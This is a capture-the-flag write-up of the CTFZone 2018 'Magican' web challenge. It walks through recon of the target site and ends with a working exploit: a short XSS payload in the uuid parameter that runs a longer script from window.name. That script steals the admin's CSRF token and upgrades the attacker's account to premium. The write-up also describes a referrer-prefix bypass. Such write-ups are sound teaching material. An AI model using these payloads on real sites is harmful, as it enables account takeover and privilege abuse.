@@ -1,0 +1,70 @@
+<h1>Magican &ndash; write-up by @terjanq</h1>
+
+<p><em>CTFZone 2018 Quals, 7/24/18</em></p>
+
+<h2>Description</h2>
+
+<p>We are provided with a simple website <br />
+![website]</p>
+
+<p>and the only functionalities are <code>login/register</code>, <code>edit profile</code>, <code>support</code>. </p>
+
+<p><code>Support</code> section allows us to send two types of messages to the admin: <code>Problems with Profile</code> and <code>Get premium account</code>. Each of them contains two fields: <code>Link to profile</code> and <code>Message</code>. <br />
+![support]</p>
+
+<p><code>Edit profile</code> section allows us to edit our name. <br />
+![profile]</p>
+
+<h2>Quick research</h2>
+
+<ul>
+<li><p>When we manually edit the <code>Link to profile</code> field to <code>http://ourwebsite</code> in the first option of <code>Support</code> section the admin will visit it and thanks to the <code>User-Agent header</code> we could see that the admin is using <code>Firefox 61.0</code>.  </p></li>
+<li><p><code>HTTP response header</code> looks like:
+<code>
+&lt; Content-Security-Policy: style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; Referrer-Policy: origin
+&lt; Server: Apache/2.4.25 (Debian)
+&lt; X-Content-Type-Options: nosniff
+&lt; X-Frame-Options: ALLOW-FROM http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one
+&lt; X-Powered-By: PHP/7.0.30
+&lt; X-XSS-Protection: 1; mode=block
+</code>
+and means that</p>
+
+<ul>
+<li>we cannot include any external <code>scripts</code> and <code>styles</code></li>
+<li>we cannot embed the website into <code>iframe</code> on external website (however Google will allow it due to the <em>incorrect header</em>)</li>
+<li>any attempt of <code>reflected XSS</code> should be blocked by the browser</li>
+<li>we can send information out as the <code>image</code> or <code>xhr requests</code></li>
+</ul></li>
+<li><p>Parameter <code>uuid</code> in the request <code>http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid=&lt;uuid&gt;</code> is vulnerable to the injections ( XSS/CSS ) and is limited to <code>36 characters</code>. The lack of <code>XSS Auditor</code> in Firefox allows us to inject <code>XSS</code> in there. <br />
+![xss]</p></li>
+<li><p>With the help of dirbuster, I found the <code>manage.php</code> page which is the admin's tool for changing <code>user status</code> to <code>premium</code> <br />
+![manage]</p></li>
+<li><p><code>profile.php</code> and <code>manage.php</code> are protected by the <code>hidden token</code>, and tokens are associated with the current session</p></li>
+<li><p>When we try to send <code>POST</code> data to the <code>profile.php</code> or <code>manage.php</code> with <code>Referrer</code> different than <code>web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one</code> the error <code>Wrong Referrer</code> will appear. However, I found out that it only has to start with it and therefore the referrer <code>web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one.example.com</code> will be accepted!.</p></li>
+<li><p>When we try to change our status to <code>premium</code>, <code>Permission Denied!</code> appears.</p></li>
+</ul>
+
+<h2>Solution</h2>
+
+<p>Based on the findings it was obvious that our goal is to do a <code>CSRF</code> (Cross-Origin Request Forgery) attack, in order to change our status to <code>premium</code>, and the only missing piece is the <code>token</code>. It was a very tough task to steal and then send the token in <code>36 bytes</code>! With the help of [@gros] from my team we managed to create a payload <code>"&gt;&lt;svg/onload=$.globalEval(name)</code> 32 bytes long where <code>name</code> is just a short form of <code>window.name</code> property. We assigned it by sending the admin to our webpage where we triggered <code>window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="&gt;&lt;svg/onload=$.globalEval(name)', &lt;long payload&gt;)</code> setting <code>window.name</code> to <code>&lt;long payload&gt;</code>. <br />
+    The complete [forms.html] looked like: <br />
+```HTML</p>
+
+<script>
+
+      window.open('http://web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one/profile.php?uuid="><svg/onload=$.globalEval(name)', `
+
+        $.get("manage.php", function(data){    
+                var x = /name="token" value="([^"]+)/.exec(data);
+                $.post("manage.php", {user_uuid: "6c1e8255-ceed-428a-8b48-74e13db8142d", token: x[1], status: "premium"}); 
+         });
+
+   `);
+
+</script>
+
+<p>```
+And after sending the admin to that page, on my profile I could find the flag: <strong>ctfzone{0190af5705a38115cd6dee6e7d79e317}</strong></p>
